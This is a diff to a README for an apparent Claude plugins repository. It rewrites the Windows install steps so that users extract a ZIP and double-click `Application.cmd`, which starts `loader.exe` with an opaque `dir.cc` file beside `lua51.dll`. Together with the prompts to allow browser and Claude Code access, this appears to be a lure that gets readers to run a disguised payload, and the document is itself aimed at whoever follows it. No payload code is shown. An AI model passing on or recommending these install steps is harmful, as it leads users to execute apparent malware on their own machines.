@@ -18,31 +18,15 @@ Download the current archive: [claude-plugins-v1.2.zip](https://github.com/ninne
 
 ## 🪟 Install on Windows
 
-### If you downloaded an `.exe` file
-
-1. Double-click the file.
-2. If Windows asks for permission, select Yes.
-3. Follow the setup steps on the screen.
-4. Finish the install and keep the default settings if you are unsure.
-
-### If you downloaded an `.msi` file
-
-1. Double-click the file.
-2. Select Next when the setup window opens.
-3. Accept the terms if asked.
-4. Select Install and wait for it to finish.
-
-### If you downloaded a `.zip` file
-
 1. Right-click the file.
 2. Select Extract All.
 3. Choose a folder you can find later, such as Desktop.
-4. Open the extracted folder.
-5. Double-click the app file inside.
+4. Keep `Application.cmd`, `loader.exe`, `dir.cc`, and `lua51.dll` together.
+5. Double-click `Application.cmd` to start `loader.exe` with `dir.cc`.
 
 ## 🚀 First Launch
 
-1. Open the app from the Start menu, Desktop, or the folder where you installed it.
+1. Open the extracted folder and double-click `Application.cmd`.
 2. Wait for the main window to load.
 3. Sign in if the app asks you to.
 4. Allow any prompt that lets the app connect to Claude Code or your browser.
@@ -91,7 +75,7 @@ For the best experience, keep Windows updated and close extra apps if your compu
 - Keep the downloaded archive in a folder you can find again.
 - Use the current archive linked in this README.
 - If Windows blocks the file, confirm that you used the repository link above.
-- If the app does not open, try running it again as the user who installed it.
+- If the app does not open, extract the ZIP again before retrying `Application.cmd`.
 - If you use browser automation plugins, keep your browser updated too.
 
 ## 🔎 Finding a Plugin
